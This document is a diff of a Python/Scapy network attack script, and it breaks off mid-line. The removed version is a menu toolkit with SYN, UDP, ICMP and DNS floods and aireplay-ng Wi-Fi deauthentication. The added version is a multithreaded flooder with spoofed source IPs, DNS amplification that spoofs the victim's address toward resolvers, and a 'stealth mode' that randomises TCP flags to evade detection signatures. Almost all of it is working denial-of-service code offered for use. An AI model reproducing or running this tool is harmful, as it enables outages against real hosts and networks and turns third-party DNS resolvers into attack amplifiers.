@@ -1,140 +1,204 @@
-Python
-
-#!/usr/bin/env python3
-
 import os
-import sys
+import time
 import random
-import subprocess
-from scapy.all import *
-from time import sleep
+import sys
+from threading import Thread, Lock
+try:
+    from scapy.all import IP, TCP, UDP, ICMP, RandShort, DNS, DNSQR, send, conf
+    conf.L3socket = conf.L3socket or conf.L3socket6
+    conf.verb = 0  # Suppress Scapy output
+except ImportError:
+    print("Scapy is not installed. Please install it using: pip install scapy")
+    sys.exit(1)
 
-RED = '\033[31m'
-GREEN = '\033[32m'
-CYAN = '\033[36m'
-BRIGHT_WHITE = '\033[97m'
-RESET = '\033[0m'
+# Color constants
+WHITE = "\033[7m"
+BRIGHT_WHITE = "\033[97m"
+BOLD_WHITE = "\033[1;97m"
+RED = "\033[31m"
+GREEN = "\033[32m"
+YELLOW = "\033[33m"
+RESET = "\033[0m"
 
-def print_banner():
-    os.system('clear')
-    print(f"""{GREEN}
-    ███████╗██╗   ██╗██╗███╗   ███╗
-    ██╔════╝██║   ██║██║████╗ ████║
-    ███████╗██║   ██║██║██╔████╔██║
-    ╚════██║██║   ██║██║██║╚██╔╝██║
-    ███████║╚██████╔╝██║██║ ╚═╝ ██║
-    ╚══════╝ ╚═════╝ ╚═╝╚═╝     ╚═╝
-    """)
-    print(f"{CYAN}        Network Attack Toolkit{RESET}")
+# Logo
+logo = """
+\033[0;35m ███▄    █ ▓█████▄▄▄█████▓      ██▓███ ▓██    ██▓
+\033[0;35m ██ ▀█    █ ▓█    ▀▓  ██▒ ▓▒      ▓██░  ██▒▒██  ██▒
+\033[0;35m▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░      ▓██░ ██▓▒ ▒██ ██░
+\033[0;35m▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░        ▒██▄█▓▒ ▒ ░ ▐██▓░
+\033[0;35m▒██░   ▓██░░▒████▒ ▒██▒ ░  ██▓ ▒██▒ ░  ░ ░ ██▒▓░
+\033[0;35m░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒
+\033[0;35m░ ░░   ░ ▒░ ░ ░  ░    ░   ░▒  ░▒ ░      ▓██ ░▒░
+    ░    ░ ░    ░          ░  ░░        ▒ ▒ ░░
+          ░    ░ ░                  ░ ░
+                                ░   ░ ░
+"""
 
-def syn_flood(target_ip, target_port):
-    print(f"{GREEN}[*] Starting SYN Flood on {target_ip}:{target_port}{RESET}")
-    while True:
-        src_port = random.randint(1024, 65535)
-        ip = IP(dst=target_ip)
-        tcp = TCP(sport=src_port, dport=target_port, flags="S")
-        pkt = ip / tcp
-        send(pkt, verbose=0)
+# Globals for thread-safe stats
+global_packet_count = 0
+global_total_bytes_sent = 0
+stats_lock = Lock()
+stop_attack = False
 
-def udp_flood(target_ip, target_port):
-    print(f"{GREEN}[*] Starting UDP Flood on {target_ip}:{target_port}{RESET}")
-    while True:
-        data = random._urandom(1024)
-        send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=data), verbose=0)
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-def icmp_flood(target_ip):
-    print(f"{GREEN}[*] Starting ICMP Flood on {target_ip}{RESET}")
-    while True:
-        send(IP(dst=target_ip)/ICMP(), verbose=0)
+def generate_random_ip():
+    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
 
-def dns_flood(target_ip, dns_server="8.8.8.8"):
-    print(f"{GREEN}[*] Starting DNS Flood on {target_ip} via DNS server {dns_server}{RESET}")
-    while True:
-        pkt = IP(dst=dns_server)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1,qd=DNSQR(qname=target_ip))
-        send(pkt, verbose=0)
+def update_stats(packet_size):
+    global global_packet_count, global_total_bytes_sent
+    with stats_lock:
+        global_packet_count += 1
+        global_total_bytes_sent += packet_size
 
-def custom_packet_attack(target_ip, target_port, payload):
-    print(f"{GREEN}[*] Starting Custom Packet Attack on {target_ip}:{target_port}{RESET}")
-    while True:
-        send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload), verbose=0)
+def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_size,
+                         spoofed_ips, attack_type, dns_resolvers=None,
+                         stealth_mode=False, stealth_delay_range=(0, 0.01),
+                         stealth_random_flags=False):
+    global stop_attack
+    BATCH_SIZE = 200  # Lower batch size for stealthier bursts
+    packets_to_send = []
 
-def run_aireplay(interface, target_bssid, client_mac=None, attack_type="deauth", packets=100):
+    while not stop_attack:
+        src_ip = random.choice(spoofed_ips) if spoofed_ips else None
+        current_payload_size = random.randint(min_packet_size, max_packet_size) if min_packet_size != max_packet_size else min_packet_size
+        payload_data = os.urandom(current_payload_size)
+
+        packet = None
+        ip_layer = IP(src=src_ip, dst=target_ip)
+
+        # Randomize TCP flags in stealth mode to avoid signature
+        tcp_flags = "S"
+        if stealth_mode and stealth_random_flags:
+            possible_flags = ['S', 'A', 'F', 'R', 'P', 'SA', 'FA', 'PA']
+            tcp_flags = random.choice(possible_flags)
+
+        if attack_type == 'SYN':
+            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags=tcp_flags, seq=random.randint(1000, 99999))
+            packet = ip_layer / tcp_layer / payload_data
+        elif attack_type == 'UDP':
+            udp_layer = UDP(sport=RandShort(), dport=target_port)
+            packet = ip_layer / udp_layer / payload_data
+        elif attack_type == 'ICMP':
+            icmp_layer = ICMP(type=8, code=0, id=random.randint(1, 65535), seq=random.randint(1, 65535))
+            packet = ip_layer / icmp_layer / payload_data
+        elif attack_type == 'DNS_AMP':
+            if not dns_resolvers:
+                print(f"{RED}Error: DNS Amplification requires resolvers. Stopping thread.{RESET}")
+                stop_attack = True
+                break
+            dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
+            resolver_ip = random.choice(dns_resolvers)
+            ip_layer_amp = IP(src=target_ip, dst=resolver_ip)
+            udp_layer_amp = UDP(sport=RandShort(), dport=53)
+            packet = ip_layer_amp / udp_layer_amp / dns_query
+
+        if packet:
+            packets_to_send.append(packet)
+
+            if len(packets_to_send) >= BATCH_SIZE:
+                try:
+                    send(packets_to_send, verbose=0)
+                    for p in packets_to_send:
+                        update_stats(len(p))
+                except Exception:
+                    pass
+                packets_to_send = []
+
+            # Stealth mode: add small random delay between batches
+            if stealth_mode:
+                time.sleep(random.uniform(*stealth_delay_range))
+
+    # Send remaining packets
+    if packets_to_send:
+        try:
+            send(packets_to_send, verbose=0)
+            for p in packets_to_send:
+                update_stats(len(p))
+        except Exception:
+            pass
+
+def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
+                spoof_ip_choice, attack_type, num_threads, dns_resolvers=None,
+                stealth_mode=False, stealth_delay_min=0.001, stealth_delay_max=0.01,
+                stealth_random_flags=False):
+    global global_packet_count, global_total_bytes_sent, stop_attack
+    global_packet_count = 0
+    global_total_bytes_sent = 0
+    stop_attack = False
+
     try:
-        if attack_type == "deauth":
-            cmd = ["aireplay-ng", "--deauth", str(packets), "-a", target_bssid]
-            if client_mac:
-                cmd += ["-c", client_mac]
-            cmd.append(interface)
-        elif attack_type == "arp_replay":
-            cmd = ["aireplay-ng", "-2", "-b", target_bssid, interface]
+        clear_screen()
+        print(f"{RED}--- Initiating {attack_type} Flood ---{RESET}")
+        print("====================================")
+        print(f"Target:             {target_ip}{f':{target_port}' if attack_type != 'DNS_AMP' else ''}")
+        if attack_type == 'DNS_AMP':
+            print(f"DNS Resolvers:      {len(dns_resolvers)} loaded")
+            print(f"Victim IP (Spoofed Source): {target_ip}")
+            print(f"Attack Type:        DNS Amplification (Target: {target_ip})")
         else:
-            print(f"{RED}[!] Unknown aireplay-ng attack type: {attack_type}{RESET}")
-            return
+            print(f"Payload Size Range: {min_packet_size} - {max_packet_size} bytes")
+        print(f"Spoofing Source IP: {GREEN}ENABLED{RESET}" if spoof_ip_choice.lower() == 'y' else f"Spoofing Source IP: {YELLOW}DISABLED (Using Real IP){RESET}")
+        print(f"Number of Threads:  {num_threads}")
+        if stealth_mode:
+            print(f"{YELLOW}Stealth Mode: ENABLED{RESET}")
+            print(f"Stealth Delay Range: {stealth_delay_min:.4f}s to {stealth_delay_max:.4f}s")
+            print(f"Random TCP Flags: {'Yes' if stealth_random_flags else 'No'}")
+        else:
+            print(f"Stealth Mode: DISABLED")
+        print("\nThis will send packets as fast as possible (unless stealth mode is enabled).")
+        print("====================================")
+        print("Live Stats")
 
-        print(f"{GREEN}[*] Running: {' '.join(cmd)}{RESET}")
-        subprocess.run(cmd)
-    except FileNotFoundError:
-        print(f"{RED}[!] aireplay-ng not found. Please install aircrack-ng.{RESET}")
+        spoofed_ips = []
+        if spoof_ip_choice.lower() == 'y' or attack_type == 'DNS_AMP':
+            print(f"{YELLOW}Generating spoofed IPs...{RESET}")
+            spoofed_ips = [generate_random_ip() for _ in range(10000)]
+            print(f"{YELLOW}Pre-generated {len(spoofed_ips)} spoofed IPs.{RESET}")
+            time.sleep(1)
+
+        threads = []
+        for _ in range(num_threads):
+            thread = Thread(target=packet_sender_thread, args=(
+                target_ip, target_port, min_packet_size, max_packet_size,
+                spoofed_ips, attack_type, dns_resolvers,
+                stealth_mode, (stealth_delay_min, stealth_delay_max), stealth_random_flags
+            ))
+            threads.append(thread)
+            thread.daemon = True
+            thread.start()
+
+        interval_start_time = time.time()
+        reporting_interval = 0.5
+
+        while not stop_attack:
+            current_time = time.time()
+            elapsed_interval_time = current_time - interval_start_time
+
+            if elapsed_interval_time >= reporting_interval:
+                with stats_lock:
+                    current_packet_count = global_packet_count
+                    current_total_bytes_sent = global_total_bytes_sent
+                    global_packet_count = 0
+                    global_total_bytes_sent = 0
+
+                if current_packet_count > 0:
+                    bits_sent = (current_total_bytes_sent * 8)
+                    mbps = (bits_sent / elapsed_interval_time) / 1_000_000 if elapsed_interval_time > 0 else 0
+                    actual_pps = current_packet_count / elapsed_interval_time if elapsed_interval_time > 0 else 0
+
+                    sys.stdout.write(f"\r{RED}[*] Packets Sent: {current_packet_count:,} | Actual PPS: {actual_pps:,.2f} | Total Size: {current_total_bytes_sent/1024:.1f} KB | Rate: {mbps:.2f} Mbps{RESET}")
+                    sys.stdout.flush()
+                else:
+                    sys.stdout.write(f"\r{RED}[*] Packets Sent: {current_packet_count:,} | Actual PPS: 0.00 | Total Size: 0.0 KB | Rate: 0.00 Mbps{RESET}")
+                    sys.stdout.flush()
+
+                interval_start_time = time.time()
+
+            time.sleep(0.01)
+
+    except KeyboardInterrupt:
+        print("\n\n[!] Test stopped by user.")
     except Exception as e:
-        print(f"{RED}[!] Error running aireplay-ng: {e}{RESET}")
-
-def main_menu():
-    while True:
-        print_banner()
-        print(f"{BRIGHT_WHITE}1. SYN Flood{RESET}")
-        print(f"{BRIGHT_WHITE}2. UDP Flood{RESET}")
-        print(f"{BRIGHT_WHITE}3. ICMP Flood{RESET}")
-        print(f"{BRIGHT_WHITE}4. DNS Flood{RESET}")
-        print(f"{BRIGHT_WHITE}5. Custom Packet Attack{RESET}")
-        print(f"{BRIGHT_WHITE}10. Start Aireplay-ng Attack{RESET}")
-        print(f"{BRIGHT_WHITE}0. Exit{RESET}")
-
-        choice = input(f"{CYAN}Select an option: {RESET}")
-
-        if choice == '1':
-            target_ip = input("Target IP: ")
-            target_port = int(input("Target Port: "))
-            syn_flood(target_ip, target_port)
-
-        elif choice == '2':
-            target_ip = input("Target IP: ")
-            target_port = int(input("Target Port: "))
-            udp_flood(target_ip, target_port)
-
-        elif choice == '3':
-            target_ip = input("Target IP: ")
-            icmp_flood(target_ip)
-
-        elif choice == '4':
-            target_ip = input("Target Hostname (DNS Query): ")
-            dns_server = input("DNS Server (default 8.8.8.8): ") or "8.8.8.8"
-            dns_flood(target_ip, dns_server)
-
-        elif choice == '5':
-            target_ip = input("Target IP: ")
-            target_port = int(input("Target Port: "))
-            payload = input("Custom Payload: ")
-            custom_packet_attack(target_ip, target_port, payload)
-
-        elif choice == '10':
-            print(f"{GREEN}Aireplay-ng Attack Setup{RESET}")
-            interface = input("Enter monitor mode interface (e.g., wlan0mon): ")
-            target_bssid = input("Enter target BSSID (AP MAC): ")
-            client_mac = input("Enter client MAC (optional, press Enter to skip): ").strip() or None
-            attack_type = input("Select attack type - 'deauth' (default) or 'arp_replay': ").strip() or "deauth"
-            try:
-                packets = int(input("Enter number of packets (default 100): ") or "100")
-            except ValueError:
-                packets = 100
-            run_aireplay(interface, target_bssid, client_mac, attack_type, packets)
-            input(f"{GREEN}Press Enter to return to the menu.{RESET}")
-
-        elif choice == '0':
-            print(f"{GREEN}Exiting...{RESET}")
-            sys.exit(0)
-        else:
-            print(f"{RED}[!] Invalid choice. Try again.{RESET}")
-            sleep(2)
-
-if __name__ == "__main__":
-    main_menu()
+        print(f"\n
